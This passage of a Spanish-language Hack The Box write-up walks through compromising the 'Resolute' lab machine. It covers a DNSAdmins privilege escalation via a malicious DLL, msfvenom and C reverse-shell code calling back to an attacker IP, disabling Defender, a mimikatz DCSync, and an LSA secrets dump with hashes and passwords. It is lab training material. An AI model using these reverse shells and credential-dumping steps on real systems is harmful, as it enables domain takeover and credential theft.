+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS C:\PSTranscripts\20191203></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Estas credenciales al probarlas con SMB nos devuelven un <code class="language-plaintext highlighter-rouge">Pwn3d!</code> sin embargo este usuario no tiene privilegios de escritura que es <code class="language-plaintext highlighter-rouge">WRITE</code> en ningun recurso SMB</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u ryan -p Serv3r4Admin4cc123!
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\ryan:Serv3r4Admin4cc123! </span><span class="am">(Pwn3d!)</span><span class="p">
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u ryan -p Serv3r4Admin4cc123! --shares
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\ryan:Serv3r4Admin4cc123! </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al probar estas credenciales hacia <code class="language-plaintext highlighter-rouge">winrm</code> nuevamente nos devuelve que son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm megabank.local -u ryan -p Serv3r4Admin4cc123!
+</span><span class="az">SMB         </span><span class="p">megabank.local  5985   RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)  
+</span><span class="az">HTTP        </span><span class="p">megabank.local  5985   RESOLUTE         </span><span class="az">[*] </span><span class="p">http://megabank.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">megabank.local  5985   RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\ryan:Serv3r4Admin4cc123! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos usando <code class="language-plaintext highlighter-rouge">evil-winrm</code> y conseguir una powershell como <code class="language-plaintext highlighter-rouge">ryan</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i megabank.local -u ryan -p Serv3r4Admin4cc123!  
+PS C:\Users\ryan\Documents> </span><span class="am">whoami</span><span class="p">
+megabank\ryan
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Después de enumerar el <code class="language-plaintext highlighter-rouge">dominio</code> y subir la información recolectada a <code class="language-plaintext highlighter-rouge">bloodhound</code> podemos encontrar que el usuario <code class="language-plaintext highlighter-rouge">ryan</code> forma parte del grupo <code class="language-plaintext highlighter-rouge">DNSAdmins</code></p>
+<a href="/htb/resolute/1.png" target="_blank"><div><p><img src="/htb/resolute/1.png"></p></div></a>
+
+<p class="plain-text">En <a href="https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/">lolbas</a> encontramos una forma para mediante <code class="language-plaintext highlighter-rouge">dnscmd</code> cargar un dll al iniciar el servicio, iniciamos creando un <code class="language-plaintext highlighter-rouge">dll</code> malicioso y compartiendolo con un recurso <code class="language-plaintext highlighter-rouge">smb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f dll -o shell.dll  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll
+
+</span><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos configurando con <code class="language-plaintext highlighter-rouge">dnscmd</code> para el arranque del servicio <code class="language-plaintext highlighter-rouge">dns</code>, para que este cargue el <code class="language-plaintext highlighter-rouge">dll</code> malicioso que creamos antes de nuestro recurso <code class="language-plaintext highlighter-rouge">smb</code> al iniciarse</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">dnscmd</span><span class="p"> /config /serverlevelplugindll \\10.10.14.10\kali\shell.dll  
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora simplemente nos queda dentener e iniciar el servicio dns usando <code class="language-plaintext highlighter-rouge">sc.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">sc.exe </span><span class="p">stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+PS C:\Users\ryan\Documents> </span><span class="am">sc.exe </span><span class="p">start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)  
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3932
+        FLAGS              :
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al volver a iniciar el <code class="language-plaintext highlighter-rouge">servicio</code> este realiza una petición como la maquina <code class="language-plaintext highlighter-rouge">RESOLUTE$</code> a nuestra maquina, y al cargar el <code class="language-plaintext highlighter-rouge">dll</code> malicioso nos envia una reverse <code class="language-plaintext highlighter-rouge">shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.169,50763)
+[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
+[*] User RESOLUTE\RESOLUTE$ authenticated successfully
+[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:6a5f93f3e287203626c14e32c63b50a5:010100000000000080e22c24eeaad901ac96772e9f34a36a00000000010010005a006c004f0071006b006c0068006700030010005a006c004f0071006b006c0068006700020010004d0042007600490047006e007a005a00040010004d0042007600490047006e007a005a000700080080e22c24eeaad901060004000200000008003000300000000000000000000000004000006c14702b8a0a5bcb8a5cb0083ee71d6f249b57c4dd8542761efb111e279d89350a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100350035000000000000000000  
+[*] Connecting Share(1:kali)
+[*] Disconnecting Share(1:kali)
+[*] Closing down connection (10.10.10.169,50763)
+[*] Remaining connections []</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La shell que recibimos es como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> que tiene maximos privilegios sobre el equipo por lo que ahora podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> de Administrator</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.169 
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+004**************************5a8
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra1">
+<br><h3 class="post-title">Extra - manual dll</h3><br>
+
+<p class="plain-text">Como extra podemos crear un <code class="language-plaintext highlighter-rouge">dll</code> manualmente para ejecutar los comandos, pero antes subiremos <code class="language-plaintext highlighter-rouge">netcat.exe</code> para facilitar el comando para enviarnos la <code class="language-plaintext highlighter-rouge">shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">upload </span><span class="p">netcat.exe C:\ProgramData\netcat.exe  
+</span><span class="az">
+Info: Uploading netcat.exe to C:\ProgramData\netcat.exe
+</span><span class="sa">
+Data: 60360 bytes of 60360 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora mediante un programa en <code class="language-plaintext highlighter-rouge">C</code> podemos hacer que como proceso ejecute con <code class="language-plaintext highlighter-rouge">WinExec</code> el <code class="language-plaintext highlighter-rouge">netcat.exe</code> que subimos para asi enviarnos una <code class="language-plaintext highlighter-rouge">shell</code> a nuestro host</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#include </span><span class="s">&ltwindows.h>
+</span><span class="o">#include </span><span class="s">&ltstdio.h>
+</span><span class="o">#include </span><span class="s">&ltstdlib.h>
+
+</span><span class="no">int </span><span class="na">pwn</span><span class="p">()
+{
+    WinExec(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">cmd.exe /c C:</span><span class="mi">\\</span><span class="s">ProgramData</span><span class="mi">\\</span><span class="s">netcat.exe 10.10.14.10 443 -e powershell"</span><span class="p">, </span><span class="mi">0</span><span class="p">);  
+    </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+}
+
+</span><span class="na">BOOL APIENTRY DllMain</span><span class="p">(</span><span class="na">HMODULE </span><span class="am">hModule</span><span class="p">, </span><span class="na">DWORD </span><span class="am">ul_reason_for_call</span><span class="p">, </span><span class="na">LPVOID </span><span class="am">lpReserved</span><span class="p">)
+{
+    </span><span class="o">switch</span><span class="p"> (ul_reason_for_call)
+    {
+    </span><span class="o">case </span><span class="p">DLL_PROCESS_ATTACH:
+        pwn();
+    </span><span class="o">case </span><span class="p">DLL_THREAD_ATTACH:
+    </span><span class="o">case </span><span class="p">DLL_THREAD_DETACH:
+    </span><span class="o">case </span><span class="p">DLL_PROCESS_DETACH:
+        </span><span class="o">break</span><span class="p">;
+    }
+    </span><span class="o">return </span><span class="mi">TRUE</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">x86_64-w64-mingw32-gcc</code> podemos compilar el C como un archivo <code class="language-plaintext highlighter-rouge">dll</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ x86_64-w64-mingw32-gcc </span><span class="p">code.c -shared -o shell.dll  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de compartirlo en un recurso <code class="language-plaintext highlighter-rouge">smb</code> repetimos el proceso, configuramos el dll con <code class="language-plaintext highlighter-rouge">dnscmd</code>, ademas apagamos e iniciamos el servicio dns usando <code class="language-plaintext highlighter-rouge">sc.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">dnscmd</span><span class="p"> /config /serverlevelplugindll \\10.10.14.10\kali\shell.dll  
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+PS C:\Users\ryan\Documents> </span><span class="am">sc.exe </span><span class="p">stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+PS C:\Users\ryan\Documents> </span><span class="am">sc.exe </span><span class="p">start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3932
+        FLAGS              :
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo ejecutara el <code class="language-plaintext highlighter-rouge">comando</code> que configuramos en nuestro <code class="language-plaintext highlighter-rouge">dll</code>, el cual usando <code class="language-plaintext highlighter-rouge">netcat.exe</code> nos envia una <code class="language-plaintext highlighter-rouge">powershell</code> como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.169
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+004**************************5a8
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra2">
+<br><h3 class="post-title">Extra - password</h3><br>
+
+<p class="plain-text">Solo como extra con <code class="language-plaintext highlighter-rouge">mimikatz</code> haremos un <code class="language-plaintext highlighter-rouge">dcsync</code> para dumpear los hashes del <code class="language-plaintext highlighter-rouge">ntds</code>, sin embargo nos salta el <code class="language-plaintext highlighter-rouge">antivirus</code> y nos bloquea la ejecucion de mimikatz</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\mimikatz.exe </span><span class="az">'lsadump::dcsync /domain:megabank.local /user:Administrator' </span><span class="p">exit  
+</span><span class="ro">Program 'mimikatz.exe' failed to run: Operation did not complete successfully 
+because the file contains a virus or potentially unwanted softwareAt line:1 
+char:1
++ .\mimikatz.exe 'lsadump::dcsync /domain:megabank.local /user:Administ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\mimikatz.exe 'lsadump::dcsync /domain:megabank.local /user:Administ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedEx 
+   ception
+    + FullyQualifiedErrorId : NativeCommandFailed</span><span class="p">
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Somos <code class="language-plaintext highlighter-rouge">nt authority\system</code> asi que podemos simplemente <code class="language-plaintext highlighter-rouge">deshabilitarlo</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Set-MpPreference </span><span class="c1">-DisableRealtimeMonitoring </span><span class="ve">$true  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvemos a correr el <code class="language-plaintext highlighter-rouge">mimikatz</code> para hacer un <code class="language-plaintext highlighter-rouge">dcsync</code> y ahora se ejecuta correctamente, podemos ver el hash <code class="language-plaintext highlighter-rouge">NT</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\mimikatz.exe </span><span class="az">'lsadump::dcsync /domain:megabank.local /user:Administrator'</span><span class="p"> exit  
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::dcsync /domain:megabank.local /user:Administrator
+[DC] 'megabank.local' will be the domain
+[DC] 'Resolute.megabank.local' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   : 
+Password last change : 6/29/2023 6:17:03 PM
+Object Security ID   : S-1-5-21-1392959593-3013219662-3596683436-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 0: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 1: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 2: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 3: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 4: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 5: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 6: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 7: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 8: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm- 9: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-10: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-11: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-12: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-13: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-14: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-15: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-16: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-17: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-18: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-19: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-20: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-21: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-22: fb3b106896cdaa8a08072775fbd9afe9
+    ntlm-23: fb3b106896cdaa8a08072775fbd9afe9
+    lm  - 0: 0fbfb230f47a3b1f17bc46dd73f3ae9c
+    lm  - 1: ea49542e625ce3674c6212f1be3655b2
+    lm  - 2: e7fde15392d04a878944db9da8c0a4ff
+    lm  - 3: 70876b5f10d83b7270e2e58393a650b1
+    lm  - 4: bae720633d0647de22504d66fce46fb4
+    lm  - 5: 0cf70d8a42eb4cb00bbd621329eecba7
+    lm  - 6: 6f9d06c56eff037314e52b1db35a1a6d
+    lm  - 7: 28dbbf62829b447bd10c263d8ac15074
+    lm  - 8: 9b81f5243024b4b2e4093ed14b52f225
+    lm  - 9: 50b12b22fdcf00584ce720289f149292
+    lm  -10: 3c17fcdedad7fa5fb8e82db4842f38c3
+    lm  -11: 1d3597a55c6878986054deff049c927c
+    lm  -12: f72ae0c87562873ceb76b4ff38e7d580
+    lm  -13: 64a9e09b3fa532daf7421ab0d38ba91d
+    lm  -14: 2554a14308f67b7c79f7463fef16824d
+    lm  -15: c7ea232d5d15311d433af497a7994f8f
+    lm  -16: dbb579ba7eecab24faf7facd3d5cac3c
+    lm  -17: b2fbb919909c32199b65851159903039
+    lm  -18: 0831560ac0d539f4a5b43f3106d95560
+    lm  -19: d28492ba957ef7ae9f84d5d0573f4195
+    lm  -20: 26253279126dd69c5db73420b7133415
+    lm  -21: 618784c053b8d8c1f3904e0463218e7d
+    lm  -22: 589f302a19a13fa1a33468dc523510bd
+    lm  -23: c788612f0f0971e8d9550d88900a14b1
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 7b31399b121f8e5bdf469e17ae1356c6
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : MEGABANK.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 2c729d2a189d5ffdf4792a66eee8e7d37a6e5c37b57a722c307791e7a466f741
+      aes128_hmac       (4096) : e175930b43cf0835cf361c9cb8d964b1
+      des_cbc_md5       (4096) : 235e4979aeba1073
+    OldCredentials
+      aes256_hmac       (4096) : 2c729d2a189d5ffdf4792a66eee8e7d37a6e5c37b57a722c307791e7a466f741
+      aes128_hmac       (4096) : e175930b43cf0835cf361c9cb8d964b1
+      des_cbc_md5       (4096) : 235e4979aeba1073
+    OlderCredentials
+      aes256_hmac       (4096) : 2c729d2a189d5ffdf4792a66eee8e7d37a6e5c37b57a722c307791e7a466f741
+      aes128_hmac       (4096) : e175930b43cf0835cf361c9cb8d964b1
+      des_cbc_md5       (4096) : 235e4979aeba1073
+
+* Primary:Kerberos *
+    Default Salt : MEGABANK.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 235e4979aeba1073
+    OldCredentials
+      des_cbc_md5       : 235e4979aeba1073
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  91d77b763419caa3973e11cacc2d59cc
+    02  2c3a6f5ad26aeb2819d9ce611b90a35f
+    03  7815cefe27f394fd55216e1ec54ca158
+    04  91d77b763419caa3973e11cacc2d59cc
+    05  20c81a2f0b5c2a080e1c2c08c223d69d
+    06  e1abc92660dad9e213cb9d8b70bcda63
+    07  5f32254b44640e8388a50832bcb2a9e7
+    08  461dd2fc6e26a0c0acf16af21a98d127
+    09  e4ebf46e13a38f2901d2db11ea5fd0dd
+    10  8ab7d906f3b895edb6c709524fbf48e4
+    11  282391b1c74048cf638427e282869368
+    12  461dd2fc6e26a0c0acf16af21a98d127
+    13  0a9f3c43c6c1885920c2337a1dbd27df
+    14  c7e047e3eda87eaf6ef73659192a7898
+    15  5d92b1e301884321b726ecc2491e25d2
+    16  879e859163b32b242c0011a0bb2ce79c
+    17  aac3711d21bbd96520f8a2dd71074ecb
+    18  e181af49d8c3b61a62990d6f2c499be9
+    19  c590b598f165c5f0b53f017ddd223504
+    20  2ab65648babb676a040447fd3fb0d3b9
+    21  fb15a4946f8d87aa7b9f4d5d034b0c9f
+    22  4a13fe33fb8b3a2881cb953661c87121
+    23  5e29b701b5f635c54a593528bfa55afa
+    24  0838febb09c3c06b2757888a712da47d
+    25  f0480b30c53e510face8f23d84ff3314
+    26  419dea986b67479108bfa84d4355613d
+    27  a15ac20b287869446e5c80fd80950b4a
+    28  9e1c72574ed84da585e55506edc141cd
+    29  51ec7801faef118241d52e6c91eeda66
+
+
+mimikatz(commandline) # exit
+Bye!
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos el hash NT de <code class="language-plaintext highlighter-rouge">Administrator</code> con crackmapexec y devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u Administrator -H fb3b106896cdaa8a08072775fbd9afe9
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\Administrator:fb3b106896cdaa8a08072775fbd9afe9 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al tener <code class="language-plaintext highlighter-rouge">privilegios</code> maximos sobre el equipo se nos permite dumpear los secretos <code class="language-plaintext highlighter-rouge">lsa</code>, al hacerlo se nos muestra la contraseña de <code class="language-plaintext highlighter-rouge">Administrator</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u Administrator -H fb3b106896cdaa8a08072775fbd9afe9 --lsa
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\Administrator:fb3b106896cdaa8a08072775fbd9afe9 </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">Dumping LSA secrets
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">MEGABANK\RESOLUTE$:aes256-cts-hmac-sha1-96:7677984257973a39a999fcae01caf323b9d7814869da1dc6b01ed9ca8d7c815f
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">MEGABANK\RESOLUTE$:aes128-cts-hmac-sha1-96:55d89826fbeb7245b7259c0970d9c60a
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">MEGABANK\RESOLUTE$:des-cbc-md5:ba8c3408c458864a
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">MEGABANK\RESOLUTE$:plain_password_hex:41f90985ad45b6401c7aca14776ac1ff950b5488e2e393790d4e8d53aa449ffd24720206677fd86ba8c61d42f0494c9680c5c38eba10a912f2175bcb6541314849f22e457cf8810299566d6707afa57a975e11065b6ea24c3b8cecd798f4c41938d982628b5357ba7de944931e8c3da93020918cc9fb6123a7602237044e902121d9af7d59771c9bb6027c133ab7f48427104c539fc52f46643c0772daf084d136d3a5d2d2e87fe732f49f6def826eeb6efc9eac75ca0d6104eadb4084e063d0f85facc7466cfbecec905180f8a962c896085e8781c2e4cfab3728842be98792be0156d696e38cd91789b0a5c67a9eb6  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">MEGABANK\RESOLUTE$:aad3b435b51404eeaad3b435b51404ee:4e4bbb1929a7490e135200157c19f3ae:::
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">MEGABANK\Administrator:DontH4ckUsPleeze!
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">dpapi_machinekey:0x13ec6ea2ad3cf2929ab3ac9fcde6a1140342eac5
+</span><span class="am">dpapi_userkey:0x1bd8bda5c9814300b9a581fb468e78261a936302
